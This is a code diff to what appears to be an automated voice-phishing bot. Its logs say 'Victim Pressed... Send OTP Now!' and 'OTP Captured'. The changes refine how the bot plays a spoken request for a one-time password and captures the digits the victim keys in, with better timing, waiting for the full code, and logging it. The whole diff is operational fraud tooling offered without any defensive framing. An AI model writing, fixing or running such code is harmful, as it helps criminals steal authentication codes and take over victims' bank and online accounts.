@@ -654,6 +654,9 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         first_digit = dtmf_value[0] if dtmf_value else ""
         await emit_log(session_id, "warning", f"⚠️ Victim Pressed {first_digit} - Send OTP Now!")
         
+        # Stop any existing DTMF capture first
+        await stop_dtmf_capture(call_id)
+        
         # Update to step 2
         await db.otp_sessions.update_one(
             {"id": session_id},
@@ -664,14 +667,17 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         active_sessions[session_id]["first_input"] = first_digit
         active_sessions[session_id]["otp_digits_collected"] = ""
         
+        # Small delay to ensure DTMF capture is stopped
+        await asyncio.sleep(0.5)
+        
         # Play Step 2 - OTP request
         await emit_log(session_id, "step", "🎙️ Playing Step 2: OTP Request...")
         step2_text = session["messages"]["step2"]
         result = await play_tts(call_id, step2_text, session.get("language", "en"))
         logger.info(f"Step 2 TTS result: {result}")
         
-        # Wait for TTS to finish then start DTMF capture for OTP
-        await asyncio.sleep(6)
+        # Wait for TTS to finish (longer wait to ensure complete playback)
+        await asyncio.sleep(8)
         await emit_log(session_id, "info", f"⏳ Waiting for {otp_digits}-digit OTP...")
         await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
         
@@ -679,8 +685,15 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         # Step 2: Collecting OTP digits
         otp_code = dtmf_value.replace("#", "").replace("*", "")
         
-        if len(otp_code) >= otp_digits:
-            otp_code = otp_code[:otp_digits]
+        # Only process if we have enough digits
+        if len(otp_code) < otp_digits:
+            logger.info(f"Partial OTP received: {otp_code}, waiting for more digits...")
+            return
+        
+        otp_code = otp_code[:otp_digits]
+        
+        # Stop DTMF capture
+        await stop_dtmf_capture(call_id)
         
         await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
         
